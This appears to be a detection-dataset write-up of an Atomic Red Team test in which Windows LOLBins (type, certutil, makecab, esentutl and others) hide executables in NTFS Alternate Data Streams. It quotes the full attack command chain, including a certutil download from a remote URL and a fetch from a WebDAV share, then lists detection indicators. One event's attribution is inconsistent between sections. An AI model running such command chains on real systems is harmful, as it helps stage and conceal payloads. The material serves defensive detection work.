# T1564.004-1: NTFS File Attributes — Alternate Data Streams (ADS)

## Technique Context

T1564.004 (NTFS File Attributes) covers adversary use of NTFS-specific filesystem features to hide data or executables from standard directory listings and file-browsing tools. The most commonly exploited feature is Alternate Data Streams (ADS): named data streams attached to a file under the NTFS metadata model. A file `C:\temp\file.txt` can have a secondary stream `C:\temp\file.txt:hidden.exe` that contains arbitrary data — including executable code — while appearing to a casual `dir` listing as only the primary stream. ADS-stored payloads can be launched directly on some Windows versions, making this both a data-hiding and code-execution primitive.

This test is the broadest of the ADS tests: it chains nine different LOLBins to write data into ADS using distinct methods, demonstrating the range of tools an adversary might use. The tools invoked include: `type`, `extrac32`, `findstr` with redirect, `certutil`, `makecab`, `print`, `reg export`, `regedit`, `expand`, and `esentutl`.

## What This Dataset Contains

The core 4688 command line captures the entire multi-tool chain as a single long `cmd.exe /c` invocation:
```
cmd.exe /c type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
  & extrac32 c:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
  & findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe > c:\ADS\file.txt:procexp.exe
  & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/... c:\temp:ttt
  & makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
  & print /D:c:\ADS\file.txt:autoruns.exe c:\ADS\Autoruns.exe
  & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\file.txt:evilreg.reg
  & regedit /E c:\ADS\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
  & expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
  & esentutl.exe /y c:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o
```

`cmd.exe` exits with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating that Windows Defender or a file ACL blocked at least one write operation in the chain.

**Sysmon EID 8 (CreateRemoteThread)** fires with source `powershell.exe` and an unknown target process (`<unknown process>`), tagged `technique_id=T1055,technique_name=Process Injection`. This is a Defender behavior-monitoring side effect during its inspection of the cmd.exe chain, not a direct product of the ADS operations.

**Sysmon EID 3 (NetworkConnect)** captures an outbound TLS connection to `48.211.71.202:443` from `MsMpEng.exe` (Windows Defender). This is Defender's cloud lookup during scanning of the ADS activity, tagged `technique_id=T1036,technique_name=Masquerading`.

**Sysmon EID 17 (PipeCreate)** records named pipe creation by the PowerShell test framework for its own inter-process communication.

**PowerShell 4103** captures `Set-ExecutionPolicy Bypass` invocations — standard ART test framework boilerplate present in every test.

## What This Dataset Does Not Contain (and Why)

No Sysmon EID 15 (FileStream created) appears in this dataset, despite ADS being the subject of the test. Sysmon EID 15 fires when a file stream is created via the `ZwSetEaFile` / named-stream write path. The `0xC0000022` exit code for cmd.exe indicates Defender blocked the ADS writes before they completed, so the streams were never successfully created and no EID 15 events were generated.

No individual process creation events for `certutil.exe`, `makecab.exe`, `esentutl.exe`, or the other LOLBins appear in Sysmon EID 1, because these binaries are not in the sysmon-modular ProcessCreate include rules. Security 4688 also does not log the individual subprocesses because the entire chain runs within the single `cmd.exe` process using shell built-ins (`type`, `reg`, `regedit`) or direct execution without a new cmd.exe wrapper.

No network connection to GitHub (for the certutil download) is recorded. Defender's access denial prevented certutil from making the outbound request.

## Assessment

This test was largely blocked by Windows Defender. The `0xC0000022` exit code for `cmd.exe` confirms access was denied for at least the leading `type` redirect, and the absence of Sysmon EID 15 events confirms no ADS writes succeeded. The dataset is valuable for its documentation of the attempt — the full multi-tool command line is preserved — and for the Defender-generated artifacts (MsMpEng network lookup, CreateRemoteThread detection) that appear as byproducts of active endpoint protection inspecting the attack chain.

## Detection Opportunities Present in This Data

- **4688 command line containing `:` after a filename followed by another filename** (e.g., `file.txt:evil.exe`): this colon-in-path syntax is the definitive indicator of ADS usage in cmd.exe operations.
- **Presence of multiple LOLBins chained with `&` in a single `cmd.exe /c` invocation**: `certutil`, `extrac32`, `esentutl`, `makecab`, and `findstr` in one command is a strong behavioral signal.
- **`certutil.exe -urlcache -split -f` with a URL**: this certutil download pattern is a well-known T1105 (Ingress Tool Transfer) indicator regardless of the ADS destination.
- **`0xC0000022` exit code from `cmd.exe`**: Defender blocking a file operation produces this status; its presence alongside LOLBin command lines confirms Defender is active and provides an alert opportunity.
- **Sysmon EID 8 from MsMpEng during LOLBin activity**: a CreateRemoteThread event from a Defender component firing during a suspicious cmd.exe execution chain is a secondary indicator of active detection.
